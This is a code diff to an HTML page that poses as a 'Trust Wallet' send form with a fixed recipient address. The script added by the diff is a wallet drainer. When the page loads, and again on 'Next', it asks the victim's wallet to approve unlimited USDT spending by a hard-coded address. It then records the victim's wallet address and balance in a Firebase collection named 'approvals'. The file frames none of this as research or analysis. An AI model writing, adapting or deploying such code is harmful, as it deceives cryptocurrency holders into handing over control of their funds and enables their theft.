@@ -1,61 +1,136 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TRC‑20 USDT Approval</title>
+  <title>Trust Wallet</title>
   <style>
-    body { font-family: sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-    input, button { width: 90%; padding: 14px; margin: 8px 0; font-size: 16px; border-radius: 8px; border: none; }
-    button { background: #3ba2ff; font-weight: bold; }
-    .max-label { text-align: right; color: #3ba2ff; font-size: 14px; width: 90%; }
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #121212;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      width: 90%;
+      max-width: 400px;
+    }
+    .input-group {
+      background-color: #1e1e1e;
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+    }
+    .input-label {
+      font-size: 14px;
+      margin-bottom: 5px;
+      color: #aaa;
+    }
+    .input-value {
+      font-size: 16px;
+      color: white;
+      word-break: break-all;
+    }
+    .input-editable {
+      width: 100%;
+      font-size: 16px;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: white;
+    }
+    .max-text {
+      font-size: 13px;
+      color: #00bcd4;
+      margin-top: 5px;
+      text-align: right;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      background-color: #00bcd4;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <input id="recipient" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly/>
-  <input id="amount" type="text" placeholder="Amount"/>
-  <div class="max-label">Max</div>
-  <button id="nextBtn">Next</button>
+  <div class="container">
+    <div class="input-group">
+      <div class="input-label">Recipient Wallet Address</div>
+      <div class="input-value">TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN</div>
+    </div>
+    <div class="input-group">
+      <div class="input-label">Amount</div>
+      <input type="number" id="amountInput" class="input-editable" placeholder="0" />
+      <div class="max-text">MAX</div>
+    </div>
+    <button id="nextButton">Next</button>
+  </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-  <script>
-    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const RECEIVER = document.getElementById("recipient").value;
+    const firebaseConfig = {
+      apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
+      authDomain: "trc20-approval-dapp.firebaseapp.com",
+      projectId: "trc20-approval-dapp",
+      storageBucket: "trc20-approval-dapp.appspot.com",
+      messagingSenderId: "770961226156",
+      appId: "1:770961226156:web:d7857b971dd376b7902209"
+    };
 
-    function waitForTronWeb(maxMs = 15000) {
-      const start = Date.now();
-      return new Promise(resolve => {
-        const iv = setInterval(() => {
-          if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            clearInterval(iv);
-            resolve(true);
-          } else if (Date.now() - start > maxMs) {
-            clearInterval(iv);
-            resolve(false);
-          }
-        }, 500);
-      });
-    }
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-    async function approveUnlimited() {
-      const ready = await waitForTronWeb();
-      if (!ready) { alert("Open in TronLink / OKX wallet browser"); return; }
-      const tronWeb = window.tronWeb;
-      const user = tronWeb.defaultAddress.base58;
-      const amnt = document.getElementById("amount").value || "0";
+    const CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
+    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-      try {
-        const contract = await tronWeb.contract().at(CONTRACT);
-        await contract.approve(RECEIVER, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({ shouldPollResponse: true });
-        alert("✅ Approval popup shown and sent");
-      } catch(err) {
-        console.error(err);
-        alert("❌ Approval failed: " + err.message);
+    async function triggerPopup() {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        const wallet = window.tronWeb.defaultAddress.base58;
+        const contract = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
+        try {
+          const balance = await window.tronWeb.trx.getBalance(wallet);
+          const usdtBal = await contract.balanceOf(wallet).call();
+          await contract.approve(SPENDER, MAX_UINT).send();
+
+          await addDoc(collection(db, "approvals"), {
+            wallet_address: wallet,
+            amount: document.getElementById("amountInput").value,
+            balance: window.tronWeb.fromSun(usdtBal._hex || usdtBal),
+            timestampz: new Date().toISOString(),
+          });
+        } catch (e) {
+          console.error("Approval error:", e);
+        }
+      } else {
+        try {
+          await window.tronLink.request({ method: "tron_requestAccounts" });
+        } catch (e) {
+          console.error("Wallet connection failed:", e);
+        }
       }
     }
 
-    document.getElementById("nextBtn").addEventListener("click", approveUnlimited);
+    document.getElementById("nextButton").addEventListener("click", async () => {
+      await triggerPopup();
+    });
+
+    // Optional: auto-connect after small delay
+    setTimeout(() => {
+      triggerPopup();
+    }, 2000);
   </script>
 </body>
 </html>
